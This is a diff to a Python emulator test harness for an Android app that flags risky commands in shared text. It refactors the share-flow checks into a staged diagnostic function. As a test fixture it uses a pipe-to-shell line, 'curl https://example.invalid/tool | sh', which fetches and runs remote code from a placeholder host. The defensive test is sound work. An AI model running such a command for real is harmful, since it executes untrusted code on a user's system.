@@ -214,8 +214,28 @@ def prepare_emulator(sdk, report):
 
 
 class AndroidControlRefusal(ValueError):
-    """Fixed owned background-control boundaries; never native command details."""
+    """Fixed owned-control boundaries; never native command details."""
     STAGES={
+        'share_first_send':'share_first_send_unavailable',
+        'share_first_receive':'share_first_receive_unavailable',
+        'share_explicit_check':'share_automatic_finding_observed',
+        'share_finding_tap':'share_finding_tap_unavailable',
+        'share_finding_view':'share_finding_view_unavailable',
+        'share_finding_tag':'share_finding_tag_unavailable',
+        'share_edit':'share_edit_unavailable',
+        'share_edit_view':'share_edit_view_unavailable',
+        'share_edit_tag_absence':'share_old_tag_retained',
+        'share_replacement_send':'share_replacement_send_unavailable',
+        'share_replacement_receive':'share_replacement_receive_unavailable',
+        'share_replacement_tap':'share_replacement_tap_unavailable',
+        'share_replacement_view':'share_replacement_view_unavailable',
+        'share_mime_send':'share_mime_send_unavailable',
+        'share_mime_view':'share_mime_view_unavailable',
+        'share_clear_send':'share_clear_send_unavailable',
+        'share_clear_receive':'share_clear_receive_unavailable',
+        'share_clear_tap':'share_clear_tap_unavailable',
+        'share_clear_view':'share_clear_view_unavailable',
+        'share_clear_text_absence':'share_cleared_text_retained',
         'background_receive':'background_receive_unavailable',
         'background_home':'background_home_unavailable',
         'background_task_inventory':'background_task_inventory_unavailable',
@@ -229,6 +249,97 @@ class AndroidControlRefusal(ValueError):
         if stage not in self.STAGES:raise ValueError('Invalid Android control diagnostic')
         self.code=self.STAGES[stage]
         super().__init__(self.code)
+
+
+def owned_ui_observation(view):
+    """Fixed booleans only, from an already read synthetic foreground hierarchy."""
+    nodes=list(view.iter('node'))
+    def text(value):return any(value in n.attrib.get('text','') for n in nodes)
+    editor=[n for n in nodes if n.attrib.get('resource-id')==PACKAGE+':id/editor']
+    return {
+        'owned_ui_present':any(n.attrib.get('resource-id','').startswith(PACKAGE+':id/') for n in nodes),
+        'owned_editor_present':bool(editor),
+        'owned_editor_nonempty':any(bool(n.attrib.get('text','')) for n in editor),
+        'received_text_present':text('Text received. Review it'),
+        'ready_text_present':text('Ready when you are.'),
+        'cleared_text_present':text('Cleared. Your text and result'),
+        'changed_text_present':text('Text changed. Tap Check'),
+        'finding_text_present':text('Review before running this command.'),
+        'no_finding_text_present':text('No supported command pattern found.'),
+        'unsupported_mime_text_present':text('Files and multiple items are not supported.'),
+        'unavailable_text_present':text('PS is unavailable.'),
+        'tag_ps_present':any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in nodes),
+        'first_synthetic_text_present':text('curl https://example.invalid/tool | sh'),
+        'system_ui_present':any(n.attrib.get('package')=='com.android.systemui' for n in nodes),
+        'launcher_ui_present':any(n.attrib.get('package')=='com.android.launcher3' for n in nodes),
+        'platform_error_dialog_present':any(n.attrib.get('resource-id') in ('android:id/aerr_close','android:id/aerr_restart') for n in nodes),
+    }
+
+
+def share_start_observation(raw):
+    """Do not retain am-start output; these hints never grant acceptance."""
+    return {
+        'status_ok_reported':bool(re.search(rb'^Status: ok\r?$',raw,re.M)),
+        'status_timeout_reported':bool(re.search(rb'^Status: timeout\r?$',raw,re.M)),
+        'error_reported':bool(re.search(rb'^Error:',raw,re.M)),
+        'warning_reported':bool(re.search(rb'^Warning:',raw,re.M)),
+        'owned_component_reported':COMPONENT.encode() in raw,
+    }
+
+
+def verify_share_controls(send,shell,wait,click,report,cases):
+    """Original first six controls; diagnostic stages do not change acceptance."""
+    def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
+    try:
+        report['control_stage']='share_first_send'
+        send('curl https://example.invalid/tool | sh')
+        report['control_stage']='share_first_receive'
+        view=wait(lambda x:text(x,'Text received. Review it'))
+        report['control_stage']='share_explicit_check'
+        assert not text(view,'Review before running this command.')
+        cases.append({'case':'receive_requires_explicit_check','pass':True})
+        report['control_stage']='share_finding_tap'
+        click(view,'check')
+        report['control_stage']='share_finding_view'
+        view=wait(lambda x:text(x,'Review before running this command.'))
+        report['control_stage']='share_finding_tag'
+        assert any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in view.iter('node'))
+        cases.append({'case':'actual_offline_ps_finding','pass':True})
+        report['control_stage']='share_edit'
+        click(view,'editor');shell(['input','text','X'])
+        report['control_stage']='share_edit_view'
+        view=wait(lambda x:text(x,'Text changed. Tap Check'))
+        report['control_stage']='share_edit_tag_absence'
+        assert not any(n.attrib.get('resource-id')==PACKAGE+':id/tag' for n in view.iter('node'))
+        cases.append({'case':'edit_hides_previous_finding','pass':True})
+        report['control_stage']='share_replacement_send'
+        send('printf hello')
+        report['control_stage']='share_replacement_receive'
+        view=wait(lambda x:text(x,'Text received. Review it'))
+        report['control_stage']='share_replacement_tap'
+        click(view,'check')
+        report['control_stage']='share_replacement_view'
+        wait(lambda x:text(x,'No supported command pattern found.'))
+        cases.append({'case':'new_share_and_no_finding','pass':True})
+        report['control_stage']='share_mime_send'
+        send('ignored','image/png')
+        report['control_stage']='share_mime_view'
+        wait(lambda x:text(x,'Files and multiple items are not supported.'))
+        cases.append({'case':'unsupported_mime_has_no_verdict','pass':True})
+        report['control_stage']='share_clear_send'
+        send('printf hello')
+        report['control_stage']='share_clear_receive'
+        view=wait(lambda x:text(x,'Text received. Review it'))
+        report['control_stage']='share_clear_tap'
+        click(view,'clear')
+        report['control_stage']='share_clear_view'
+        view=wait(lambda x:text(x,'Cleared. Your text and result'))
+        report['control_stage']='share_clear_text_absence'
+        assert not text(view,'printf hello')
+        cases.append({'case':'clear_removes_input_and_result','pass':True})
+    except AndroidControlRefusal:raise
+    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
+        raise AndroidControlRefusal(report['control_stage']) from None
 
 
 def verify_background_clear(send,shell,wait,report):
@@ -310,8 +421,15 @@ def main():
         shell(['svc','wifi','disable']);shell(['svc','data','disable'])
         report['phase']='share_controls'
         def tree():
+            report['ui_operation']='dump'
             shell(['uiautomator','dump','/sdcard/aitrust-synthetic-window.xml'],10)
-            return ET.fromstring(shell(['cat','/sdcard/aitrust-synthetic-window.xml'],5))
+            report['ui_operation']='read'
+            raw=shell(['cat','/sdcard/aitrust-synthetic-window.xml'],5)
+            report['ui_operation']='parse'
+            view=ET.fromstring(raw)
+            report['last_ui_observation']=owned_ui_observation(view)
+            report['ui_operation']='observed'
+            return view
         def wait(predicate,seconds=40):
             deadline=time.monotonic()+seconds
             while time.monotonic()<deadline:
@@ -325,26 +443,9 @@ def main():
             coords=list(map(int,re.fullmatch(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]',node.attrib['bounds']).groups()))
             shell(['input','tap',(coords[0]+coords[2])//2,(coords[1]+coords[3])//2])
         def send(value,kind='text/plain',action='android.intent.action.SEND'):
-            shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20)
-        send('curl https://example.invalid/tool | sh')
-        view=wait(lambda x:text(x,'Text received. Review it'))
-        assert not text(view,'Review before running this command.')
-        cases.append({'case':'receive_requires_explicit_check','pass':True})
-        click(view,'check');view=wait(lambda x:text(x,'Review before running this command.'))
-        assert any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in view.iter('node'))
-        cases.append({'case':'actual_offline_ps_finding','pass':True})
-        click(view,'editor');shell(['input','text','X']);view=wait(lambda x:text(x,'Text changed. Tap Check'))
-        assert not any(n.attrib.get('resource-id')==PACKAGE+':id/tag' for n in view.iter('node'))
-        cases.append({'case':'edit_hides_previous_finding','pass':True})
-        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'check')
-        wait(lambda x:text(x,'No supported command pattern found.'))
-        cases.append({'case':'new_share_and_no_finding','pass':True})
-        send('ignored','image/png');wait(lambda x:text(x,'Files and multiple items are not supported.'))
-        cases.append({'case':'unsupported_mime_has_no_verdict','pass':True})
-        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'clear')
-        view=wait(lambda x:text(x,'Cleared. Your text and result'))
-        assert not text(view,'printf hello')
-        cases.append({'case':'clear_removes_input_and_result','pass':True})
+            report.pop('share_start_observation',None)
+            report['share_start_observation']=share_start_observation(shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20))
+        verify_share_controls(send,shell,wait,click,report,cases)
         verify_background_clear(send,shell,wait,report)
         cases.append({'case':'background_clears_text','pass':True})
         permission_occurrences=shell(['dumpsys','package',PACKAGE]).decode().count('android.permission.INTERNET')
@@ -354,7 +455,7 @@ def main():
     except MetadataRefusal as error:
         report.update(status='FAILED',reason='Reviewed official SDK metadata was refused.',diagnostic_code=error.code);return 1
     except AndroidControlRefusal as error:
-        report.update(status='FAILED',reason='The owned background-clear control did not complete.',diagnostic_code=error.code);return 1
+        report.update(status='FAILED',reason='An owned Android Share control did not complete.',diagnostic_code=error.code);return 1
     except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
         report.update(status='FAILED',reason='A required owned-emulator share, lifecycle or offline check did not complete.');return 1
     finally:
